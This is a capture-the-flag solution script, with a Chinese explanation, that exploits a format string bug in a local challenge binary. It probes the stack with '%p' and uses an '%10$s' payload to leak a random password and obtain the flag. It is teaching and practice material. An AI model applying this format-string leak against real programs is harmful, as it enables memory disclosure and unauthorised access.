#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
这是一道格式化字符串漏洞的题目，这道题还是比较简单的，
就是给你一个随机数，猜对这个随机数了就给你cat flag，
然后我们就利用printf函数的格式化字符串漏洞去泄漏出随机数的数值，
这道题就迎刃而解了。


可以看到这道题只有格式化字符串的问题，栈溢出完全没办法利用，
另外还开了canary和NX
我们要泄漏password的话，首先得找到格式化字符串的地址在哪里，
于是我们需要输入“AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p。。。。”
这样的一大串东西，结果如下：

我们可以看到，%p泄漏出了printf栈里面的东西，
并且可以发现AAAA也就是“0x41414141”在第十个位置，
也就是说格式化字符串在栈的第十个位置，
于是我们就可以构造：【泄漏地址】+%10$s，
来把password给泄漏出来
完整exp如下：

'''
from pwn import *
context.log_level = 'debug'
p = process('./crack')
password_val_addr=0x0804A048
payload = p32(password_val_addr)+'#'+'%10$s'+'#'
#为了方便下面接收的时候进行识别，需要用一个字符来加以标志
print payload  #   H\xa0\x0#%10$s#

p.recvuntil('What your name ? ')
p.sendline(payload)

p.recvuntil("#")
r = p.recvuntil("#")
print r    #   x\x9e`#
print r[:4]  #   x\x9e`
password = u32(r[:4])
print password   #  1611505272
p.recvuntil("Your password :")
p.sendline(str(password))

p.interactive()
